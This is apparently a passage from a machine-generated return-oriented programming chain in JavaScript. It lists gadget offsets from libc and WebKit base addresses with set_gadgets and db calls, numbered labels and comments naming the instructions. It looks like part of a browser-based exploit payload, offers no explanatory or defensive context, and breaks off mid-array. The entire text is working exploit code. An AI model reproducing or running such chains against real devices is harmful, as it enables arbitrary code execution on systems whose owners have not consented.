set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+101064,//L904
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+101080,//L905
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L904:
db([0,0]);
set_gadget(libc_base+772328,);
//L905:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+101224,//L908
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+101192,//L906
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+101208,//L907
webkit_base+4687784,
libc_base+165442
]);
//L906:
db([0,0]);
set_gadget(libc_base+772328,);
//L907:
db([0,0]);
set_gadget(libc_base+768796,);
//L908:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+101296,//L910
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L910:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+101352,//L912
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L912:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+101448,//L914
webkit_base+4687784,
libc_base+768796
]);
//L913:
db([15,0]);// 0xf
set_gadget(webkit_base+3789839,);//pop r11
//L914:
db([0,0]);
set_gadget(libc_base+772328,);
//L915:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+101544,//L916
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+101560,//L917
webkit_base+4687784,
libc_base+772328
]);
//L916:
db([0,0]);
set_gadget(libc_base+768796,);
//L917:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+101648,//L919
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L919:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+101704,//L921
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L921:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+101776,//L923
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L923:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+101832,//L925
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L925:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
//L926:
libc_base+432565,//mov rax,rdx
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+101984,//L929
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L927:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L929:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+102072,//L931
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+102088,//L932
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L931:
db([0,0]);
set_gadget(libc_base+772328,);
//L932:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+102232,//L935
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+102200,//L933
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+102216,//L934
webkit_base+4687784,
libc_base+165442
]);
//L933:
db([0,0]);
set_gadget(libc_base+772328,);
//L934:
db([0,0]);
set_gadget(libc_base+768796,);
//L935:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+102304,//L937
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L937:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+102360,//L939
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L939:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+102456,//L941
webkit_base+4687784,
libc_base+768796
]);
//L940:
db([16,0]);// 0x10
set_gadget(webkit_base+3789839,);//pop r11
//L941:
db([0,0]);
set_gadget(libc_base+772328,);
//L942:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+102552,//L943
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+102568,//L944
webkit_base+4687784,
libc_base+772328
]);
//L943:
db([0,0]);
set_gadget(libc_base+768796,);
//L944:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+102656,//L946
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L946:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+102712,//L948
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L948:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+102784,//L950
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L950:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+102840,//L952
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L952:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
//L953:
libc_base+713278,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+102992,//L956
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L954:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L956:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+103080,//L958
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+103096,//L959
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L958:
db([0,0]);
set_gadget(libc_base+772328,);
//L959:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+103240,//L962
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+103208,//L960
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+103224,//L961
webkit_base+4687784,
libc_base+165442
]);
//L960:
db([0,0]);
set_gadget(libc_base+772328,);
//L961:
db([0,0]);
set_gadget(libc_base+768796,);
//L962:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+103312,//L964
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L964:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+103368,//L966
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L966:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+103464,//L968
webkit_base+4687784,
libc_base+768796
]);
//L967:
db([17,0]);// 0x11
set_gadget(webkit_base+3789839,);//pop r11
//L968:
db([0,0]);
set_gadget(libc_base+772328,);
//L969:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+103560,//L970
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+103576,//L971
webkit_base+4687784,
libc_base+772328
]);
//L970:
db([0,0]);
set_gadget(libc_base+768796,);
//L971:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+103664,//L973
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L973:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+103720,//L975
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L975:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+103792,//L977
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L977:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+103848,//L979
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L979:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+103952,//L982
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L980:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L982:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+104040,//L984
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+104056,//L985
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L984:
db([0,0]);
set_gadget(libc_base+772328,);
//L985:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+104200,//L988
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+104168,//L986
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+104184,//L987
webkit_base+4687784,
libc_base+165442
]);
//L986:
db([0,0]);
set_gadget(libc_base+772328,);
//L987:
db([0,0]);
set_gadget(libc_base+768796,);
//L988:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+104272,//L990
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L990:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+104328,//L992
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L992:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+104424,//L994
webkit_base+4687784,
libc_base+768796
]);
//L993:
db([4,0]);// 0x4
set_gadget(webkit_base+3789839,);//pop r11
//L994:
db([0,0]);
set_gadget(libc_base+772328,);
//L995:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+104520,//L996
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+104536,//L997
webkit_base+4687784,
libc_base+772328
]);
//L996:
db([0,0]);
set_gadget(libc_base+768796,);
//L997:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+104624,//L999
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L999:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+104680,//L1001
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1001:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+104800,//L1004
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1002:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1004:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+104888,//L1006
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+104904,//L1007
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1006:
db([0,0]);
set_gadget(libc_base+772328,);
//L1007:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+105048,//L1010
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+105016,//L1008
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+105032,//L1009
webkit_base+4687784,
libc_base+165442
]);
//L1008:
db([0,0]);
set_gadget(libc_base+772328,);
//L1009:
db([0,0]);
set_gadget(libc_base+768796,);
//L1010:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+105120,//L1012
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1012:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+105176,//L1014
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1014:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+105272,//L1016
webkit_base+4687784,
libc_base+768796
]);
//L1015:
db([18,0]);// 0x12
set_gadget(webkit_base+3789839,);//pop r11
//L1016:
db([0,0]);
set_gadget(libc_base+772328,);
//L1017:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+105368,//L1018
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+105384,//L1019
webkit_base+4687784,
libc_base+772328
]);
//L1018:
db([0,0]);
set_gadget(libc_base+768796,);
//L1019:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+105472,//L1021
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1021:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+105528,//L1023
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1023:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+105600,//L1025
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1025:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+105656,//L1027
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1027:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
//L1028:
webkit_base+4687784,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+105808,//L1031
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1029:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1031:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+105896,//L1033
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+105912,//L1034
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1033:
db([0,0]);
set_gadget(libc_base+772328,);
//L1034:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+106056,//L1037
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+106024,//L1035
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+106040,//L1036
webkit_base+4687784,
libc_base+165442
]);
//L1035:
db([0,0]);
set_gadget(libc_base+772328,);
//L1036:
db([0,0]);
set_gadget(libc_base+768796,);
//L1037:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+106128,//L1039
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1039:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+106184,//L1041
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1041:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+106280,//L1043
webkit_base+4687784,
libc_base+768796
]);
//L1042:
db([19,0]);// 0x13
set_gadget(webkit_base+3789839,);//pop r11
//L1043:
db([0,0]);
set_gadget(libc_base+772328,);
//L1044:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+106376,//L1045
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+106392,//L1046
webkit_base+4687784,
libc_base+772328
]);
//L1045:
db([0,0]);
set_gadget(libc_base+768796,);
//L1046:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+106480,//L1048
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1048:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+106536,//L1050
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1050:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+106608,//L1052
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1052:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+106664,//L1054
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1054:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
//L1055:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+106816,//L1058
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1056:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1058:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+106904,//L1060
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+106920,//L1061
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1060:
db([0,0]);
set_gadget(libc_base+772328,);
//L1061:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+107064,//L1064
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+107032,//L1062
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+107048,//L1063
webkit_base+4687784,
libc_base+165442
]);
//L1062:
db([0,0]);
set_gadget(libc_base+772328,);
//L1063:
db([0,0]);
set_gadget(libc_base+768796,);
//L1064:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+107136,//L1066
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1066:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+107192,//L1068
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1068:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+107288,//L1070
webkit_base+4687784,
libc_base+768796
]);
//L1069:
db([20,0]);// 0x14
set_gadget(webkit_base+3789839,);//pop r11
//L1070:
db([0,0]);
set_gadget(libc_base+772328,);
//L1071:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+107384,//L1072
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+107400,//L1073
webkit_base+4687784,
libc_base+772328
]);
//L1072:
db([0,0]);
set_gadget(libc_base+768796,);
//L1073:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+107488,//L1075
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1075:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+107544,//L1077
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1077:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+107616,//L1079
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1079:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+107672,//L1081
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1081:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
//L1082:
libc_base+713278,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+107824,//L1085
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1083:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1085:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+107912,//L1087
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+107928,//L1088
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1087:
db([0,0]);
set_gadget(libc_base+772328,);
//L1088:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+108072,//L1091
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+108040,//L1089
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+108056,//L1090
webkit_base+4687784,
libc_base+165442
]);
//L1089:
db([0,0]);
set_gadget(libc_base+772328,);
//L1090:
db([0,0]);
set_gadget(libc_base+768796,);
//L1091:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+108144,//L1093
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1093:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+108200,//L1095
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1095:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+108296,//L1097
webkit_base+4687784,
libc_base+768796
]);
//L1096:
db([21,0]);// 0x15
set_gadget(webkit_base+3789839,);//pop r11
//L1097:
db([0,0]);
set_gadget(libc_base+772328,);
//L1098:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+108392,//L1099
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+108408,//L1100
webkit_base+4687784,
libc_base+772328
]);
//L1099:
db([0,0]);
set_gadget(libc_base+768796,);
//L1100:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+108496,//L1102
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1102:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+108552,//L1104
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1104:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+108624,//L1106
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1106:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+108680,//L1108
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1108:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+108784,//L1111
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1109:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L1111:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+108872,//L1113
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+108888,//L1114
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1113:
db([0,0]);
set_gadget(libc_base+772328,);
//L1114:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+109032,//L1117
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+109000,//L1115
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+109016,//L1116
webkit_base+4687784,
libc_base+165442
]);
//L1115:
db([0,0]);
set_gadget(libc_base+772328,);
//L1116:
db([0,0]);
set_gadget(libc_base+768796,);
//L1117:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+109104,//L1119
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1119:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+109160,//L1121
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1121:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+109256,//L1123
webkit_base+4687784,
libc_base+768796
]);
//L1122:
db([3,0]);// 0x3
set_gadget(webkit_base+3789839,);//pop r11
//L1123:
db([0,0]);
set_gadget(libc_base+772328,);
//L1124:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+109352,//L1125
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+109368,//L1126
webkit_base+4687784,
libc_base+772328
]);
//L1125:
db([0,0]);
set_gadget(libc_base+768796,);
//L1126:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+109456,//L1128
webkit_base+4687784,
